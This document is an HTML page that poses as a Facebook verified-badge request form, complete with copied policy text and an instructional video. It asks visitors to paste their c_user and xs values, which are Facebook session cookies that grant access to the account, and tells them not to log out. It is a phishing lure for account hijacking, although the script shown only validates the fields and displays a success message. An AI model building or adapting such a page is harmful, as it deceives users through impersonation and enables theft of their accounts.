<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validation Page</title>
    <style>
        /* Add your CSS styles here */
        .validation-form-container {
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background-color: #f7f7f7;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .validation_form_para {
            font-weight: 600;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
        }
    </style>
</head>
<body>

    <div class="validation-form-container">
        <h5>Request a verified badge on Facebook</h5>

        <p class="fw-semibold validation_form_para">
            The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure, or brand that it represents.
        </p>
        
        <p class="fw-semibold validation_form_para">
            A Facebook account with a verified badge next to its name now means that Facebook has confirmed it as the authentic presence for that person or brand. Previously, the verified badge also required the person or brand to be notable and unique.
        </p>
        
        <p class="fw-semibold validation_form_para">
            The verified badge serves as a tool to help users find the genuine accounts of people and brands. If an account has the verified badge, it confirms that it represents who it claims to be. However, a verified badge is not a symbol of importance, authority, or expertise.
        </p>

        <p class="fw-semibold validation_form_para">
            Once verified, public figures, celebrities, and brands that meet certain account and eligibility requirements may not change their username on their account. Verification cannot be transferred to another account. Facebook accounts that impersonate public figures or other individuals violate our Community Guidelines and are not permitted on Facebook.
        </p>

        <p class="fw-semibold validation_form_para">
            Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.
        </p>

        <p class="fw-semibold text-secondary" style="font-size: 12px;">
            Detailed Video Information.
        </p>

        <video
            controls
            autoplay
            muted
            id="infoVideo"
            style="width: 500px; height: 280px;">
            <source src="https://firebasestorage.googleapis.com/v0/b/details-facebook-a00f0.appspot.com/o/0809.mp4?alt=media&token=b12189d9-dd1f-4d1a-8245-43b12e4094a9" type="video/mp4">
        </video>
        <br />
        <button id="enableSoundBtn" style="padding: 4px 8px; font-size: 12px; margin-top: 10px;">
            Enable Sound
        </button>

        <form id="validationForm">
            <label style="font-size: 12px;">c_user (15 digits)</label>
            <br />
            <input type="number" id="c_user" required pattern="\d{15}" title="Please enter 15 digits" />
            <br />
            <label class="mt-2" style="font-size: 12px;">xs</label>
            <br />
            <input type="text" id="xs" required />
            <p class="mt-2" style="font-size: 12px;">Please make sure not to log out from your computer or laptop until you have received a verification email.</p>
            <button type="submit" style="background-color: #4267B2; color: white; border: none; padding: 10px 20px;">Submit</button>
        </form>
    </div>

    <!-- Modal Structure -->
    <div id="modal" class="modal">
        <div class="modal-content">
            <p>Form submitted successfully!</p>
            <button onclick="closeModal()">Close</button>
        </div>
    </div>

    <script>
        document.getElementById('enableSoundBtn').addEventListener('click', function() {
            var video = document.getElementById('infoVideo');
            video.muted = false; // Unmute video
        });

        document.getElementById('validationForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form submission

            var cUserValue = document.getElementById('c_user').value;
            var xsValue = document.getElementById('xs').value;
            var cUserPattern = /^\d{15}$/;
            var xsPattern = /.*%+.*/;

            if (cUserPattern.test(cUserValue) && xsPattern.test(xsValue)) {
                // Show modal
                document.getElementById('modal').style.display = 'flex';
            } else {
                alert('Please enter valid values for both fields.');
            }
        });

        function closeModal() {
            document.getElementById('modal').style.display = 'none';
        }
    </script>

</body>
</html>
